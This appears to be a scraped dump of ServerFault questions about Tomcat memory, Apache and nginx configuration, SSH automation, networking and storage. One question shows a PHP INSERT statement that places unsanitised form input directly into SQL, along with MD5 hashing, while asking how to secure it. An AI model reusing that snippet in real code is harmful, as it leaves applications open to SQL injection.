<p>2 weeks ago I updated the WAR (tomcat) and the memory jumped to 1.2gb and 400-500mb swap. At first I thought it's normal because I did change something that should consume more memory.</p>
<p>I needed to restart the server (for another reason). Only then I realized that the memory got down again to 600-800mb and 300mb swap and it was like that for some time. Meaning previously, something hogged the memory and it was released with the restart.</p>
<p>After 2 weeks with the same consumption, I updated the WAR and again I noticed that after the re-deployment, the memory jumped to 1.2gb with 400mb swap. This time I only restarted the tomcat service and the memory consumption got down to 600mb and 100mb swap.</p>
<p>htop shows that Java is the one that consumes the memory but how can I know what is it exactly that is hogging the memory after undeploy/deploy that only a service restart releases it?</p>
<p>Thanks</p>
","<java><ubuntu-18.04><memory-usage><swap><tomcat9>","2020-07-03 12:07:02"
"1023990","2.	Consider a network 192.168.0.0/24. Specify the 04 subnetworks of the aforementioned network with complete details of each network","<ol start=""2"">
<li>Consider a network 192.168.0.0/24.
Specify the 04 subnetworks of the aforementioned network with complete details of each network</li>
</ol>
","<networking>","2020-07-04 11:46:35"
"835444","Server becomes too slow with high traffic http requests for tracking page loads of multiple sites","<p>We have the following server resources :</p>

<pre><code>16GB RAM Memory
Intel Xeon E5-2650 v2 @ 2.60GHz (8 Core)
240GB SSD (RAID 10)
1 IP Address (2 extra)
Unmetered Traffic / 1Gbit Port / 100Mbps guaranteed
</code></pre>

<p>We are using piece of javascript on around 30 websites untill now sends HTTP requests to PHP script located on our server to track the page loads and save the website information in our MySQL DB.</p>

<p>So the requests sometimes reach millions a day and the server becomes too slow, once I disable sending the requests to our server, everything works fine.</p>

<p>From the apache error log, I found the following error :</p>

<pre><code>[core:notice] [pid 4918:tid 139902294153344] AH00094: Command line: '/usr/sbin/httpd'
[mpm_worker:error] [pid 4918:tid 139902294153344] AH00287: server is within MinSpareThreads of MaxRequestWorkers, consider raising the MaxRequestWorkers setting
[mpm_worker:error] [pid 4918:tid 139902294153344] AH00286: server reached MaxRequestWorkers setting, consider raising the MaxRequestWorkers setting
</code></pre>

<p>Also :</p>

<pre><code>[mpm_event:error] [pid 22565:tid 140163371042688] AH00485: scoreboard is full, not at MaxRequestWorkers
</code></pre>

<p>After digging into this issue, I found an article to set the optimal configuration for Apache httpd.conf for such issues :</p>

<pre><code>StartServers 5
&lt;IfModule prefork.c&gt;
    MinSpareServers 25
    MaxSpareServers 50
&lt;/IfModule&gt;

ServerLimit 256
MaxRequestWorkers 1000
MaxConnectionsPerChild 10000
KeepAlive On
KeepAliveTimeout 100
MaxKeepAliveRequests Unlimited
Timeout 300
</code></pre>

<p>Still getting the same, I was thinking that it might be issue with many transactions to db in the same time, so I stopped the storing to db part in the script and got the same issue.</p>

<p>Any suggestions regarding the above issue ?</p>

<p>Assume we have moved to cloud hosting with more resources, is it still fine to save such requests to db immediatly ? I was thinking of saving into file and dump it each 4 hours for ex.</p>
","<mysql><php><apache-2.4><load-balancing><high-volume>","2017-02-28 15:47:17"
"1024091","Two apache servers on same machine with same port","<p>I have a self hosted apache website with php and mysql on my Raspberry Pi. Now I need to make another one for my new domain but I have no other computer to run the server on. Is there a way for me to run the server on the same machine, with the same port? If not, how may I alter the port so there is no need for me to type example.com:portnumber. I need it to be example.com.</p>
","<linux><apache-2.4><http><port><url>","2020-07-05 15:28:51"
"835569","How to avoid RFC1918 A record, leaking on the external network?","<p>How to avoid RFC1918 A record, leaking on the external network ? </p>

<p>I can use the view to achieve my request ,but when the dns record more and more in the management will become very troublesome.</p>

<p>I wonder if there is a simpler approach.</p>

<p>Thanks in advance.</p>
","<linux><ubuntu><security><bind>","2017-03-01 07:49:43"
"835595","telnet to Yandex's smtp port wont work on Google Cloud Plaltform","<p>I'm trying to send mail on my server which on located on vps in Google Cloud. I can telnet to gmail's SMTP both 587/465 but i can't connect via telnet to Yandex.</p>

<p>It's stucking on Trying ....</p>

<pre><code># telnet mail.yandex.ru 587
Trying 213.180.193.125...
</code></pre>

<p>I opened all ports (both tcp and udp) but still same.</p>
","<email><google-cloud-platform><telnet>","2017-03-01 10:17:50"
"1024235","Azure: whats the difference between ""basic"" and ""standard"" SKU for public IP, and which should I Chose?","<p>to create a public IP for a server, so it can &quot;see&quot; the outside world, and so I can SSH to it, I need to create a static ip.  This can be &quot;standard&quot; or &quot;Basic&quot;. What is the difference, and which should I chose?</p>
","<networking><azure>","2020-07-06 17:09:42"
"1024260","Identify source of DNS queries","<p>I am running <a href=""https://pi-hole.net/"" rel=""nofollow noreferrer"">Pi-hole</a> as the DNS server on our home network. There is a continuous stream of about 400 queries per minute of alternating requests for &quot;A&quot; and &quot;AAAA&quot; records from another Raspberry Pi on the network. All these queries are for the host name of the rouge Pi. In other words it is asking for it's own address.</p>
<p>Typical query logs look like this:</p>
<pre><code>Type    Domain         Client         Status         Reply
===========================================================
AAAA    rouge.local    rouge.local    OK (cached)    NODATA
A       rouge.local    rouge.local    OK (cached)    IP
AAAA    rouge.local    rouge.local    OK (cached)    NODATA
A       rouge.local    rouge.local    OK (cached)    IP
AAAA    rouge.local    rouge.local    OK (cached)    NODATA
etc...
</code></pre>
<p>How do I identify what service on the rouge Pi is generating these endless queries?</p>
<p>I realise this could perhaps be asked instead on SuperUser or RaspberryPi or even AskUbuntu. I will move it if this is considered the wrong place to ask. Thanks all.</p>
","<linux><domain-name-system><raspbian>","2020-07-06 19:07:41"
"1024313","How to tail server.log and grep multiple text combination?","<p>The server log is too large, I would like to grep the logs which has &quot;/API/login&quot; and &quot;/API/init&quot; from the server log.</p>
<p>I'm able to use:</p>
<pre><code>tail -f /server.log | grep -i &quot;/API/login&quot;
</code></pre>
<p>to capture those with &quot;/API/Login&quot;</p>
<p>How to add in another condition to include &quot;/API/init&quot; as well?</p>
<p>I've tried this but couldnt work:</p>
<pre><code>tail -f /server.log | grep -i &quot;/API/login&quot; || grep -i &quot;/API/init&quot;
</code></pre>
<p>Another thing is how to output this filtered logs to a text file?</p>
<p>Thank you.</p>
","<grep><tail>","2020-07-07 08:01:35"
"1024338","How to block / deny linux user from accessing a site with htaccess?","<p>My site got hit ddos several times till now, i found that ddos traffic generally comes from linux os ... then, i wonder how to block linux users / traffic from accessing a site with htaccess??</p>
<p>Please advice..</p>
","<linux><windows><.htaccess><ddos>","2020-07-07 11:55:31"
"835704","Linux exhausted resources?","<p>We have a Debian server which runs Tomcat, inside it, a single WAR is deployed which listens for incoming MQTT messages, processes them, and forwards the result to different third-party web services (depending on the received message). Mostly everything works fine, but once in a while (almost daily right now) we start to experience what I think are communication issues (network), receiving errors like:</p>

<ol>
<li>Connection reset</li>
<li>Connection timed out</li>
<li>Host unreachable</li>
</ol>

<p>Is there any way I can diagnose such issues and get metrics or alike that could reflect some kind of network resource outage or similar problems?</p>

<p>Operating System</p>

<pre><code>Distributor ID: Debian
Description:    Debian GNU/Linux 8.6 (jessie)
Release:    8.6
Codename:   jessie
</code></pre>

<p>Kernel</p>

<pre><code>Linux tomcat-ws 3.16.0-4-amd64 #1 SMP Debian 3.16.36-1+deb8u2 (2016-10-19) x86_64 GNU/Linux
</code></pre>

<p>Java</p>

<pre><code>java version ""1.7.0_111""
OpenJDK Runtime Environment (IcedTea 2.6.7) (7u111-2.6.7-2~deb8u1)
OpenJDK 64-Bit Server VM (build 24.111-b01, mixed mode)
</code></pre>

<p>Tomcat</p>

<pre><code>Apache Tomcat/8.0.14 (Debian)
</code></pre>
","<linux><networking><debian><debian-jessie>","2017-03-01 18:05:05"
"835751","Is it possible to mount iSCSI on multiple machines?","<p>I have a freeNAS setup with iSCSI attached to my Windows machine. That servers me great cause I get all the ZFS features and easy reconnecting in Windows - Don't have to mess around with SMB mappings and reconnect issues constantly.</p>

<p>I have tried to search for setting up iSCSI to allow for multiple connections. Generally people say its a bad idea.. but maybe you it can be done with multipath or some other way?</p>
","<zfs><iscsi><truenas>","2017-03-01 22:09:17"
"1024484","Blocking new devices on a network","<p>My university has implemented a strict new network policy, which we are generally told is &quot;restricted unless permitted&quot; whereas previously it was &quot;permitted unless restricted&quot;.</p>
<p>For example, when we plug a new laptop into an ethernet port, it gets an IP address but can not ping out (either to named domains like <a href=""http://www.google.com"" rel=""nofollow noreferrer"">www.google.com</a> or numerical ones like 8.8.8.8). After asking the IT department for &quot;permission&quot;, the network then permits the laptop to connect normally.</p>
<p>Most machines connected to the network via ethernet are Windows 10 ones where the IT staff have full administrative privileges over. A small percent are staff and student laptops which may have any operating system on it, and the IT staff do not have administrative privileges over them.</p>
<p>I'm just wondering how is this policy implemented? By a MAC address whitelist/blacklist? If so, where do these whitelists/blacklists reside? At the routers in each faculty building or in a central gateway? Out of curiosity I heard other people trying to spoof their MAC addresses to existing machines connected to the network (which were turned off for the experiment) but they still had the aforementioned network blocks applied to them. So there must be something more than MAC filters.</p>
<p>Disclaimer: I am not trying to circumvent network policy, I just want to learn how things are done.</p>
<p>Thanks for any input.</p>
","<networking>","2020-07-08 10:23:15"
"1024497","Nginx access application without port","<p>I have application running with nginx on:</p>
<p><code>http://10.20.0.77:8080</code></p>
<p>At the end I want to access application via lets say <a href=""http://xyz.zyx.de"" rel=""nofollow noreferrer"">http://xyz.zyx.de</a> in my Network. The IT administrator said, that before he will set up the configuration on the DNS Server, I first need to setup reverse proxy on my application server.</p>
<p>So therefore, I am trying to achieve that, my application appears when I just request for:</p>
<p><code>http://10.20.0.77</code></p>
<p>How can I do that in nginx?</p>
<p>My current configuration is:</p>
<pre><code>server {
    listen       8080;
    server_name  10.20.0.77;
    root         /opt/html;
    index index.html index.htm;

    # Load configuration files for the default server block.
     include /etc/nginx/default.d/*.conf;

    location / {
            proxy_pass  http://10.20.0.77:8080/#/;
            proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;
            proxy_redirect off;
            proxy_buffering off;
            proxy_set_header  Host  $host:$server_port;
            proxy_set_header  X-Real-IP   $remote_addr;
            proxy_set_header  X-Forwarded-For   $proxy_add_x_forwarded_for;
    }

    error_page 404 /404.html;
        location = /40x.html {
    }

    error_page 500 502 503 504 /50x.html;
        location = /50x.html {
    }
}
</code></pre>
","<nginx><reverse-proxy>","2020-07-08 12:18:18"
"1024535","How to point cname to nginx server that uses reverse-proxy","<p>I've got a server using wildcard subdomains. I'm using nuxtjs, nginx that runs on a reverse proxy on port 3000. Every user should be able to create a subdomain on the site, for example <code>subdomain.learnbot.tk</code> this will then point to <code>learnbot.tk/school/{subdomain-name}</code>. Every user should be able to create a cname that points to their own <code>subdomain.learnbot.tk</code>.</p>
<p>But when I create a CNAME record with host as <code>@</code> and target as <code>subdomain.learnbot.tk</code> using domain name <code>https://creatorbrandedsite.tk/</code> it returns 404.</p>
<p>Here's my conf file for wildcard subdomains:</p>
<pre><code>        server {
        listen 80;
    
        server_name *.learnbot.tk;
        return 301 https://$server_name$request_uri;
    }
    
    server {
        listen 443 ssl http2 default_server;
        listen [::]:443 ssl http2 default_server;
        #include snippets/ssl-example.com.conf;
        #include snippets/ssl-params.conf;
    
        ssl_certificate /etc/letsencrypt/live/learnbot.tk/fullchain.pem; # managed by Certbot
        ssl_certificate_key /etc/letsencrypt/live/learnbot.tk/privkey.pem; # managed by Certbot
        include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
        ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot
    
        root /home/subdomain/learnbot.tk/public/current;
        index index.php index.html index.htm index.nginx-debian.html;
    
        server_name *.learnbot.tk;
    
        location / {
            proxy_pass http://localhost:3000;
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection 'upgrade';
            proxy_set_header Host $host;
            proxy_cache_bypass $http_upgrade;
        }
    
        location /blog {
            try_files $uri $uri/ /index.php$is_args$args;
        }
    
        # For Lets Encrypt certbot
        location ~ /.well-known {
            allow all;
        }
    
        location ~ \.php$ {
            include snippets/fastcgi-php.conf;
            fastcgi_pass unix:/run/php/php7.0-fpm.sock;
        }
    
        location ~ /\.ht {
            deny all;
        }
    
        location /favicon.ico { alias /var/www/html/example/favicon.ico; }
        location = /favicon.ico { log_not_found off; access_log off; }
        location = /robots.txt { log_not_found off; access_log off; allow all; }
}
</code></pre>
<p>nuxtjs conf file for main domain</p>
<pre><code>    server {
    index index.html;
    server_name learnbot.tk www.learnbot.tk;

    location / {
        # WARNING: https in proxy_pass does NOT WORK!! I spent half a day debugging this.
        #proxy_pass https://localhost:4001;
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }

    
    error_page 404 /custom_404.html;
    location = /custom_404.html {
        root /etc/nginx/sites-available/custom_nginx_error_pages;
        internal;
    }

    listen [::]:443 ssl http2; # managed by Certbot, modified by Kunal to add http2
    listen 443 ssl http2; # managed by Certbot, modified by Kunal to add http2

    #Install SSL certificates and configure https:// on a per-domain-basis by running:
    #sudo certbot --nginx
    #(when prompted, be sure to select the option to set up redirects from http to https and effectively &quot;disable&quot; http)
    ssl_certificate /etc/letsencrypt/live/learnbot.tk/fullchain.pem; # managed by Certbot
    ssl_certificate_key /etc/letsencrypt/live/learnbot.tk/privkey.pem; # managed by Certbot
    include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot
    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot

}

server {
    server_name learnbot.tk;
    if ($host = learnbot.tk) {
        return 301 https://$host$request_uri;
    } # managed by Certbot

    listen 80;
    listen [::]:80;
    return 404; # managed by Certbot
}
</code></pre>
","<nginx><pm2>","2020-07-08 17:21:44"
"1024536","Nginx rewrite image URL to another domain","<p>I have folders structure on the origin server like /images/2020/07/09/imagename.jpg and moved it all to an s3-compatible storage on a subdomain slightly changing folder structure. And now struggling to make correct redirects in case some access the image directly or it has been previously embedded somewhere using the old url.</p>
<p>So the question is how to make Nginx redirect from
<a href=""https://originsite.com/**images**/2020/07/09/imagename.jpg/png/etc"" rel=""nofollow noreferrer"">https://originsite.com/**images**/2020/07/09/imagename.jpg/png/etc</a>.
to
<a href=""https://media.originsite.com/**folder**/2020/07/09/imagename.jpg/png/etc"" rel=""nofollow noreferrer"">https://media.originsite.com/**folder**/2020/07/09/imagename.jpg/png/etc</a>.</p>
<p>Would appreciate your help.</p>
","<nginx><domain><rewrite><url>","2020-07-08 17:30:05"
"1024544","Website authentication method?","<p>Once, many years ago, I secured my website. I'm struggling to remember exactly what I did. I believe I generated a certificate (or a token???) that I delivered to a select few people I wanted to grant access to. My site somehow checked to see if the request included this certificate/token/whatever and only allowed the request through if it had one, failing fast if it wasn't valid.</p>
<p>Memory has failed me, so I'm not sure of the terminology. Can someone provide terminology (and/or a link) to what I'm trying to accomplish?</p>
","<authentication><http-authentication><integrated-authentication>","2020-07-08 18:28:52"
"835858","From pet to cattle: compare /etc/rsyslog.d/local.conf 100 times","<p>We are changing the way we handle servers: From pet to cattle.</p>

<p>In the particular case I have about 100 servers which have a file called:</p>

<p><code>/etc/rsyslog.d/local.conf</code></p>

<p>I have no clue which version is the correct one. I did some testing most are equal, but not all.</p>

<p>I would like to go the democratic way: The most common version of all 100 config files gets elected to be the canonical version.</p>

<p>Next step is to look at the files which are different.</p>

<p>I have some shell scripting knowledge, and could help myself without asking.</p>

<p>But I think my solution would be dirty.</p>

<p>How would you find the canonical version and then try to manage the different config version?</p>
","<configuration-management>","2017-03-02 11:46:31"
"1024582","How companies calculate and ensure an uptime guarantee?","<p>It is simple to calculate the expected uptime based on past data.</p>
<p>But a &quot;guarantee&quot; is totally another concept.</p>
<p>How do companies manage that?</p>
","<uptime>","2020-07-09 05:19:57"
"958429","Redundant Server Application","<p>I have two identical servers, they run linux and they have a  data base and a piece of software that is constantly recieving inputs. What is the right term that I should search for to be able to configure one as a redundant server - I mean when one fails the other one takes the job from where the first stopped. </p>

<p>Is it high availability the term that I am searching for? - Really new to this, so please help me. </p>
","<linux><redundancy>","2019-03-15 12:17:42"
"1024605","why do you need to update a whole operating system to get updated php version? (debian)","<p>I am mostly a windows guy. I have a debian 9 VM with OMV and wanted to update the php version.
I read and realised that you need to update the whole os to get the latest php version?
Why do you need to update a whole OS just to get the latest php version; I assume this is true for other software too?.</p>
","<php><debian>","2020-07-09 09:49:32"
"835936","Is there any reason to have an SSL certificate on a forward-only domain?","<p>Our company acquired a new domain name a few years ago and have been forwarding (a significant amount of) traffic from our old domain, which no longer hosts content. Is there any reason to continue paying for an SSL certificate installed at the old domain? </p>
","<ssl><domain><forwarding>","2017-03-02 17:27:27"
"1024715","how we use azure access key in real corporate environment","<p>how we use azure storage Access Key in corporate environment and what is Key and Connection string how do i use these key. If i want generate access key and want to give some other guy how he would use this key and retrieve data pleasssss guide me</p>
<p><a href=""https://i.sstatic.net/DU52a.png"" rel=""nofollow noreferrer"">enter image description here</a></p>
","<azure><storage><azure-web-apps>","2020-07-10 07:16:17"
"1024764","How do I secure my PHP forms that communicate with my MySQL Server?","<p>They are just the basic forms, they take in $input from the form and then store that directly in to the database, there is another form where it takes $input and searches for a hashed match for it.</p>
<p>How can I secure this?</p>
<p><code>$sql = &quot;INSERT IGNORE INTO MD5TABLE (plaintext, hash)</code>
<code>VALUES ('$plaintext', '$md5hash')&quot;;</code></p>
","<mysql><php><database><website><vulnerabilities>","2020-07-10 13:10:36"
"1024867","Cronjob stopped working. But cron and php script still work?","<p>I did a ImageMagick install on my CentOS webserver and afterwards my cronjobs do not work anymore.</p>
<p>I have cronjobs that executes php files. For example one cronjob execute every 15 minutes a php file that reads a json file and insert variables in my mysql database. I did not change the php files and they still work from the command line with php -q /home/admin/domains/domain.nl/public_html/command/myfile.php</p>
<p>The status of my cron is:</p>
<pre><code>[admin@server domains]$ service crond status
Redirecting to /bin/systemctl status crond.service
● crond.service - Command Scheduler
   Loaded: loaded (/usr/lib/systemd/system/crond.service; enabled; vendor preset: enabled)
   Active: active (running) since Fri 2020-07-10 22:52:30 CEST; 10h ago
 Main PID: 13519 (crond)
   CGroup: /system.slice/crond.service
           └─13519 /usr/sbin/crond -n
</code></pre>
<p>I have tried to restart my server, I have restart my cron service without result.</p>
<p>My /var/log/cron looks like</p>
<pre><code>Jul 11 09:13:01 server CROND[11480]: (root) CMD (/usr/local/directadmin/dataskq)
Jul 11 09:14:01 server CROND[11629]: (root) CMD (/usr/local/directadmin/dataskq)
Jul 11 09:15:01 server CROND[11792]: (root) CMD (/usr/local/directadmin/dataskq)
Jul 11 09:15:01 server CROND[11791]: (admin) CMD (php -q /home/admin/domains/domain.nl/public_html/command/myfile.php)
Jul 11 09:16:01 server CROND[11931]: (root) CMD (/usr/local/directadmin/dataskq)
Jul 11 09:17:01 server CROND[12075]: (root) CMD (/usr/local/directadmin/dataskq)
Jul 11 09:18:01 server CROND[12244]: (root) CMD (/usr/local/directadmin/dataskq)
Jul 11 09:19:01 server CROND[12375]: (root) CMD (/usr/local/directadmin/dataskq)
Jul 11 09:19:43 server crontab[13932]: (root) LIST (admin)
Jul 11 09:20:01 server CROND[13993]: (root) CMD (/usr/lib64/sa/sa1 1 1)
Jul 11 09:20:01 server CROND[13994]: (root) CMD (/usr/local/directadmin/dataskq)
Jul 11 09:21:01 server CROND[14168]: (root) CMD (/usr/local/directadmin/dataskq)
</code></pre>
<p>With</p>
<blockquote>
<p>php -q /home/admin/domains/domain.nl/public_html/command/myfile.php
2&gt;&amp;1 &gt;&gt;php -q
/home/admin/domains/domain.nl/public_html/command/errorlog.txt</p>
</blockquote>
<p>I try to view an extra error log, but the output to errorlog.txt is empty (but the file is made!).</p>
<p>So I do not understand why the php file is doing nothing? What steps can I do to find the problem with the cronjob?</p>
<p>Installing imageMagick was not easy. I also used the command: mount -o remount,exec /tmp</p>
","<php><cron><command>","2020-07-11 12:18:55"
"958631","Is it Safe to open a liveserver on localhost:8080 for my website on public wifi?","<p>Like mentioned in the title I want to work on my website in a Starbucks with Public wifi is there any risk of running a live server on public wifi?</p>
","<security><localhost>","2019-03-17 02:29:58"
"1024899","Setup with server and storage shelves for ~400TB on gigabit ethernet","<p>Today i sketched out a storage setup, but since i am not very experienced with enterprise level storage, i would be very glad to have the concept reality checked by more experienced folks.
Unfortunately, i didn't manage to find an existing question or report that matches this scenario.</p>
<p>Requirements are as follows:</p>
<ul>
<li>~400TB capacity with some kind of redundancy. There are off-site backups so full mirroring should not be necessary</li>
<li>There is only gigabit ethernet so the bandwidth requirement is at most to saturate this link</li>
<li>Few but large files</li>
<li>I'm trying to keep the cost around 10k€</li>
</ul>
<p>What i am looking at is buying a used HP ProLiant DL360p, 2x Xeon E5-2660 8-Core 2.20 GHz and upgrading it with 32GB to 64GB ECC RAM. I will fit a PCIe8x Dell 6G SAS HBA (4 ports) to the server.
Finally, i want to use three to four HP StorageWorks D2600 Disk Shelves, fitted with 12x12TB drives each. I have not yet decided what drives exactly, if there are suggestions, i'd be happy to hear them.</p>
<p>With the mentioned controller, i would even have a dedicated controller port for each shelf, so i could group drives per shelf (as a RAID/ZFS pool or whatever it will be) and have potential 6G SAS bandwidth for each one.</p>
<p>For the server, i suppose i will either use FreeNAS (so ZFS) or plain Linux and set everything up manually.</p>
<p>Is this a feasible setup or are there obvious flaws? I would be very grateful for any feedback.</p>
","<storage><zfs><sas>","2020-07-11 20:04:57"
"1024979","VMware ESXI - External PCI Ethernet Card","<p>I have a beast of a home server and don’t fancy purchasing another device just to learn PFSense on my network. My server only has 1 Ethernet port, I have an external PCI card I bought off from amazon but it looks like VMWare ESXI doesn’t recognise it. (It was cheap &amp; cheerful). I cant seem to find a list of compatible PCI External Eth cards. Preferably I would go for 1or10gb ports with a minimum of 3/4.</p>
<p>I’m struggling to understand or find what to buy and how to get it to work.</p>
<p>Any suggestions!</p>
<p>Thanks all!
Louis</p>
","<vmware-esxi><pfsense><10gbethernet><pci>","2020-07-12 22:45:17"
"958704","How to see all incoming requests to my server?","<p>I have a third party app and I would like to see how it communicates with the server.
Why kind of software/server I am supposed to run to log all possible connections attempts to all possible ports? (let's assume, that it could be https connections, telnet, socket opening etc.)</p>
","<logging><connection>","2019-03-17 20:22:41"
"1025001","Setting up Windows Server 2019 in my small business","<p>I am very new to the networking world so excuse my illiteracy in this subject! I tried searching for answers but there isn't any definite answer out there that I was able to find.</p>
<p>I'm trying to setup Windows Server 2019 in my small business organization and would like to know what are the best practices to follow when installing AD, DC, DHCP, SQL Server.</p>
<p><strong>What I have done currently:</strong></p>
<ol>
<li>Installed SQL Server 2019 on HyperV VM.</li>
<li>Configured/Promoted the host to the Active Directory Domain controller. (or should I have created a VM for this ? ).</li>
</ol>
<p>I need to configure DHCP and File server as well. Should this be done on host or on a separate VM ?</p>
<p>Thanks in advance!</p>
","<active-directory><dhcp><domain-controller><windows-server-2019>","2020-07-13 05:45:17"
"1025094","Can't ssh login from a remote network","<p>I relied on ssh to login to my home server from a laptop (both machines were on a local network). Now I am working away from home, so I tried to ssh login from the same laptop to the server's public IP address, but it tells me &quot;connection has timed out&quot;. I tried turning the firewall off on the server (I can also login to the server with TeamViewer) and verifying that the public IP address I have for the server is correct via whatismyip.com, but I still can't ssh login. Any suggestions on what to do next? Btw, the server is running OpenSUSE and the laptop has macOS. Thanks!</p>
","<linux><ssh><mac-osx><remote-access><opensuse>","2020-07-13 19:23:34"
"1025134","Automate SSH login WITH password","<p>Before this question gets deleted, I already read <a href=""https://serverfault.com/questions/241588/how-to-automate-ssh-login-with-password"">this</a>, <a href=""https://serverfault.com/questions/308435/ssh-login-without-password"">this</a>, <a href=""https://serverfault.com/questions/751329/ssh-allow-login-with-public-key-only-disable-login-with-password"">this</a>, and <a href=""https://serverfault.com/questions/309915/ssh-in-script-without-user-interaction"">this</a>; and most of these links don't answer my question; because:</p>
<ol>
<li>I do need a key AND password</li>
<li>I run multiple servers (50+), and I can't afford changing them all to no password.</li>
<li>The same is true for public and private keys, would take up too much time for every server.</li>
</ol>
<p>I tried sshpass, but it somehow messed up my SSH login with some of my units (I had to reset the known_hosts of the server). If I could modify my script to work with sshpass properly, it would be a possible solution.</p>
<p>I'm hoping to find, is some sort of option on ssh, that will automatically do the password; something like:</p>
<pre><code>ssh -o ConnectTimeout=5 -p 'USER_PASSWORD' USER@192.168.0.*** sensors | grep Core &gt;&gt; sensors.txt
</code></pre>
<p>Or something with a small script that can sense and auto-fill (like a macro or so?) a password (half the servers have the same PWD anyway).</p>
<p>My second issue is that I noticed that the script sometimes hangs (Ping connects, but SSH doesn't), which requires me to wait for a timeout, or restart the script. Not sure if it's a network issue, or what, but if I restart it, sometimes it does go through.</p>
<p>ConnectTimeout=5 doesn't seem to work like expected.
The script only stops, when the server is offline (no IP link established). When the server is online, but openssh doesn't handshake, the script hangs...</p>
","<ssh><password><ping><sudo>","2020-07-14 07:05:11"
"1025162","FTP Server with WEB Gui","<p>I've installed Owncloud in order to have both ftp managed and web managed file storage server.
The problem is owncloud doesn't support ftp connecting to server.
Do you know good alternatives?
Thank you!</p>
","<ftp><owncloud>","2020-07-14 10:27:38"
"1025185","What happens to an ssh process if the local IP address changes?","<p>I use a perl script (with the Semaphore package) to fire off long-running ssh commands to AWS instances.  For several reasons, I do NOT run the ssh commands in the background.</p>
<p>Recently, the Comcast fiber to our office building was cut by a construction crew.  We maintain a backup CenturyLink connection, and our IT people switched our office connection over to CenturyLink.</p>
<p>My ssh processes died with a &quot;timeout, server not responding&quot; message when we switched from Comcast to CenturyLink.  They died again when we switched back to Comcast after the fiber was repaired.</p>
<p>Is this expected behavior for an open ssh command if the local public IP address changes?  If I put the ssh commands in the background, would it solve this issue?</p>
","<ssh><perl>","2020-07-14 14:06:50"
"1025198","Getting two different results when 'cat'ing a file, and 'cat'ing a file into a variable in zsh?","<p>The file in question is <code>/sys/class/power_supply/BAT0/status</code>.</p>
<p>When I cat it, I receive <code>Full</code>. But when I do <code>status=&quot;$(cat /sys/class/power_supply/BAT0/status)&quot;</code> and then echo <code>status</code>, I receive <code>1</code> when I want it to output <code>Full</code>. I'm sure I'm just being an idiot and missing something obvious. Any help is appreciated.</p>
","<linux><terminal><zsh>","2020-07-14 15:48:40"
"958977","How do i apply ownership and permissions recursively onto a directory using another directory as reference in linux","<p>Folder A has correct ownership and permissions on all its files/subfolders.
Folder B exact same content but with ownership and permissions messed up. Need to apply chmod/chown using Folder B as reference on everything under FOlder A.</p>
","<linux><bash>","2019-03-19 15:34:12"
"906521","What MS licences would allow us to host client systems?","<p>As I understand it, Microsoft licencing is tied to an organisation. My company is a gold partner and has volume licensing. We're toying with the idea of hosting some of our clients systems, but don't know whether our existing licensing allows that.
I've seen that SPLA licences allow for monthly billing, but do other licence packs, or even the purchase of a boxed product, allow you to run production environments for clients?
Also, is there a problem having multiple clients using a single Windows server, or SQL server?</p>
","<sql-server><windows-server-2012-r2><sql><licensing>","2018-04-07 09:47:42"
"906606","Serve node.js app without sudo (apache)","<p><strong>Situation</strong>: I have an access to a directory 'public' on a server (which is no my). Content of this directory is public by www.size.com/~user, if I place there html file (for example index.html) browser shows me html page. If I place there an image it shows me and a hierarchical structure of 'public'. That's all I can do - I can't edit configuration files of apache, I can't use sudo. </p>

<p>On the server is node.js. When I execute node.js application and I use <code>curl adress:8080</code> (from the server) its works fine (if I use <code>curl www.size.com/~user</code> with or without port it doesn't work). But I can't find out a way to return right response in browsers from any device. I have tried many configurations of .htaccess, but I got 'Internal Server Error' almost every time.</p>

<p>How to force apache to return node.js app? </p>

<p><strong>I want</strong>: www.size.com/~user to return result of node.js app</p>
","<apache-2.4><.htaccess><node.js><apache2>","2018-04-08 10:19:27"
"1025396","Are Subnets Truly Secure?","<p>Subnets are managed at the VM level. A compromised VM can change it's subnet to loop through all the possibilities. By their very nature, surely they cannot be considered secure?</p>
<p>Note: I'm not a networking guru - so I may have missed something blindingly obvious...</p>
","<subnet>","2020-07-15 23:15:33"
"906634","Deny access to certain pages based on date","<p>Is it possible to deny access to certain pages using <code>.htaccess</code> based on current date?</p>

<p>Here's the deal. I've implemented April Fool's system to my sites (it basically displays some funny page that is designed to fool visitors something just happened - anything bad - every April 1st, and after reloading page it displays the actual site - using session id).</p>

<p>I want to let visitors view past April Fool's pages using a custom dirlist index page that do not list pages that are upcoming (clearly, if it is supposed to be a surprise). But I want to lock the upcoming pages so the visitors can't display upcoming pages using direct access (manually typing their address in browser address bar).</p>

<p>Pages are named using a naming schematic of <code>year.php</code> (so every year has its own fool page). Each of that page displays in a specific date - it's April 1st of that year. I want to deny access to those pages that didn't pass the current April Fool's season. So namely it's 2018. I've prepared an April Fool's page for 2019 (named <code>2019.php</code>). If visitor enters the address <code>example.com/april_fools_dir/2019.php</code>, it should show him <code>Access Denied</code> error, until it's April 1st 2019. Don't want to implement it in each page separately, and also do not want to have each that page rely on an included portion implementing this feature. I'd like to avoid having to implement this in PHP if it's possible to use that in <code>.htaccess</code>. I can figure out PHP implementation myself, but I'd like to avoid that...</p>

<p>Why do I need such feature as deny certain pages until a specific date? It's a strategic move. I don't want to have the upcoming April Fool's pages spoiled by exclusively investigative visitors that try to access the pages that are not yet listed in the history page. It will simply throw an <code>Access Denied</code> error and that page will get public after April Fool's of that particular year passed.</p>
","<.htaccess>","2018-04-08 16:24:36"
"1025454","Is it me or IPv6 is still a niche thing?","<p>Some hosting providers don’t support IPv6 at all, others such as DigitalOcean only support IPv6 on non-custom Droplets and don’t support it at all for load balancers and other shenanigans.</p>
<p>I’ve read that IPv6 requires ICMP to work properly, but can’t find good documentation on what to allow in iptables.</p>
<p>So, what’s the deal here... my quest to adopt IPv6 has been very frustrating so far. Am I missing something?</p>
<p>Should I just drop the project?</p>
","<networking><ipv6>","2020-07-16 10:33:43"
